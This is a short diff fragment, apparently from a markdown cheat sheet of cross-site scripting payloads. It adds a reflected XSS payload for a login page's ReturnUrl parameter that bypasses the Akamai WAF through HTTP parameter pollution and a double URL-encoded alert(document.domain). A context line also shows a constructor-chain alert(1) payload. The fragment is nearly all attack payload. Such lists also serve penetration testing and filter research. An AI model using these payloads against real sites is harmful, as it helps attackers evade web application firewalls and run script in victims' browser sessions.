@@ -36,6 +36,14 @@ B["constructor"]["constructor"]("alert(1)")();
 
 
 
+>Reflected XSS Akami Waf Bypass in Redirect Parameter using HTTP Parameter Pollution and Double Url Encode:
+
+```
+/login?ReturnUrl=javascript:1&ReturnUrl=%2561%256c%2565%2572%2574%2528%2564%256f%2563%2575%256d%2565%256e%2574%252e%2564%256f%256d%2561%2569%256e%2529
+```
+
+
+
 
 
 
